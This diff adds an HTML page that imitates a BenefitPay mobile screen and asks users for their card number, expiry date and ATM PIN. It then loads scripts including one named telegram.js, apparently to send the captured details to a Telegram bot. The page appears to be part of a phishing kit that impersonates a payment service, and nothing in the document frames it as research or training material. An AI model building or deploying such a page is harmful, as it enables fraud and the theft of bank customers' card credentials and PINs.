@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ATM Card Details - BenefitPay</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mobile-frame">
+        <div class="mobile-screen">
+            <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-container">
+                <img src="benefitpay-download.png" alt="BenefitPay Logo" class="logo">
+            </div>
+            <button class="lang-btn">عربي</button>
+        </div>
+
+        <!-- Card Details Section -->
+        <div class="form-section">
+            <h2 class="page-title">Enter your ATM Card details</h2>
+
+            <label class="input-label">Card Number</label>
+            <input type="text" class="card-input" placeholder="0000 0000 0000 0000" id="cardNumber" maxlength="19" oninput="formatCardNumber(this)">
+
+            <div class="row-inputs">
+                <div class="half-input">
+                    <label class="input-label">Expiry Code</label>
+                    <input type="text" class="expiry-input" placeholder="MM/YY" id="expiryCode" maxlength="5" oninput="formatExpiry(this)">
+                </div>
+                <div class="half-input">
+                    <label class="input-label">ATM Card PIN</label>
+                    <input type="password" class="pin-input" placeholder="PIN" id="cardPin" maxlength="4">
+                </div>
+            </div>
+        </div>
+
+        <!-- Next Button -->
+        <button class="start-btn" onclick="proceedToSecurity()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="telegram.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
+
